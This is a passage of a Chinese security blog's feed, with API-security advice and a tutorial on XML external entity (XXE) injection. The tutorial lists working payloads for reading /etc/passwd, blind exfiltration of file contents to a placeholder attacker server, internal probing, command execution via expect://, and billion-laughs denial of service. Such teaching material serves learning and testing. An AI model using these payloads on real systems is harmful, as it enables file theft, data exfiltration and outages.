href="https://zhuanlan.zhihu.com/p/554808001">https://zhuanlan.zhihu.com/p/554808001</a></p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p><a href="https://github.com/snoopysecurity/dvws-node">https://github.com/snoopysecurity/dvws-node</a></p><h2 id="API安全防护视角"><a href="#API安全防护视角" class="headerlink" title="API安全防护视角"></a>API安全防护视角</h2><p><img src="/2024/09/27/WebSecurity/owasptop/apisecurity/image-2.png"></p><ul><li>设法将 API 安全防护标准和实践整合到企业的软件开发生命周期中</li><li>将 API 文档和自动化安全测试纳入持续集成&#x2F;持续交付 (CI&#x2F;CD) 管道</li><li>确保对 API 应用适当且有效的身份验证和授权控制</li><li>实施速率限制措施，帮助防止 API 滥用或崩溃</li><li>使用专用网关和&#x2F;或内容交付网络增强速率限制和其他应用程序级措施，以抵御分布式拒绝服务 (DDoS) 攻击</li><li>让 API 安全防护测试成为更大范围的应用程序测试流程中不可或缺的一部分</li><li>执行持续的 API 发现</li><li>实施系统化的方法来识别和修复常见 API 漏洞，包括OWASP 十大 API 安全风险</li><li>使用基于签名的威胁检测和预防，作为针对已知 API 攻击的基准级防护</li><li>利用 AI 和行为分析来增强基于签名的检测，使 API 威胁检测的扩展性、准确性和业务相关性更强，并且能够抵御新型威胁</li><li>确保 API 安全监控和分析持续数周并覆盖多个 API 会话</li><li>作为对 API 安全监控和告警的补充，为威胁搜寻人员、开发人员、DevOps 和支持人员提供对 API 清单和活动数据的按需访问权限</li></ul><p>API 安全防护解决方案包含哪些内容？</p><ul><li>身份验证和授权： API 安全防护解决方案涉及对访问 API 的用户进行身份验证和授权，确保只有已获得授权的用户才能访问和操作数据。身份验证方法包括多重身份验证、OAuth、OpenID Connect 和 API 密钥，而授权方法包括基于角色的访问控制和基于属性的访问控制。</li><li>API 网关： API 网关作为所有 API 请求的入口点，是综合性 API 安全防护解决方案的组成部分。网关可以执行多种功能，包括身份验证、速率限制、流量管理和缓存，并且有助于防止分布式拒绝服务 (DDoS) 等攻击。</li><li>加密： API 安全防护解决方案还涉及加密，用于保护通过 API 传输的数据的安全，确保攻击者无法拦截数据。加密技术包括 SSL、TLS 和 AES 加密，可用于加密 API 请求、响应和静态数据。</li><li>速率限制： 速率限制是 API 安全防护解决方案的一项功能，通过限制用户在指定时间段内可以发出的请求数量，来帮助防止拒绝服务攻击。速率限制可以按不同的 IP 地址、用户帐户或其他参数来设置，有助于防止攻击者用大量请求淹没 API。</li><li>审计和日志记录： API 安全防护解决方案还应包括审计和日志记录，通过监测 API 活动来帮助检测和抵御安全威胁。审计涉及跟踪 API 请求和响应，而日志记录涉及用安全、防篡改的方式记录 API 事件和活动。</li><li>API 测试： API 安全防护解决方案还涉及对 API 进行测试，以识别漏洞和潜在的安全风险。API 测试可以手动执行或使用自动化工具执行，有助于确保 API 安全无虞和按预期运行。</li><li>API 监控和运行时保护： API 安全防护解决方案必须对 API 行为进行监控。了解正常行为与异常滥用的区别是保护 API 免遭恶意攻击的重要部分。</li><li>漏洞管理： API 安全防护解决方案还涉及漏洞管理，这包括识别和解决 API 中的安全漏洞。漏洞管理可以包括漏洞扫描、修补和修复，可帮助防止攻击者利用 API 中的已知漏洞。</li></ul><p>Spring Security 的 REST API 与微服务安全（2024 最新版） <a href="https://developer.aliyun.com/article/1487156">https://developer.aliyun.com/article/1487156</a></p><p>我感觉其实web安全就是在对api进行测试，其实都是和后端进行交流，只是交流的语言方式不同罢了，所以测试方式也都类似，只是规范化的api会提供相应的词典，一定程度上更加方便了fuzz</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】MicPro:Microphone-based Voice Privacy Protection</title>
      <link href="/2024/09/24/PaperReading/micpro/"/>
      <url>/2024/09/24/PaperReading/micpro/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
            <tag> Privacy Protection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】XXE（XML External Entity）漏洞</title>
      <link href="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/"/>
      <url>/2024/09/24/WebSecurity/owasptop/xmlexternalentity/</url>
      
        <content type="html"><![CDATA[<p>CTF XXE <a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a><br>XXE漏洞利用技巧：从XML到远程代码执行 <a href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>XXE（XML外部实体注入）是一种针对应用程序处理XML数据的方式的攻击。在这种攻击中，攻击者利用应用程序对XML输入的处理不当，引入或“注入”恶意内容。这可能导致未授权的数据访问、服务拒绝攻击甚至执行远程代码。</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XML文档结构包括：XML声明、DTD文档类型定义（可选）、文档元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。<br>DTD一般认为有两种引用或声明方式：<br>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><p>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY c <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;c;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></pre></td></tr></table></figure><p>参数实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image.png"><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有<br><img src="/2024/09/24/WebSecurity/owasptop/xmlexternalentity/image-1.png"></p><h2 id="XXE漏洞类型"><a href="#XXE漏洞类型" class="headerlink" title="XXE漏洞类型"></a>XXE漏洞类型</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>直接读取</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入外部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 外部实体 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h3><p>无回显的情况下</p><p>基于OOB(Out of Band的缩写，指安全数据不经过自己通信的信道进行传输)，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p><p>基于报错<br>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><ul><li>通过引入服务器文件：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- xml.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure></li><li>通过引入本地文件：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;send;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，只要是从外部引入DTD文件，并在其中定义一些实体内容就行。仔细看一下很好理解，第一个调用的参数实体是%remote，在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send。</li><li>嵌套参数实体<br>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>基于报错的三层嵌套参数实体XXE<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>        </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">&quot;test101&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。亦或者，如果目标是UNIX系统，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span 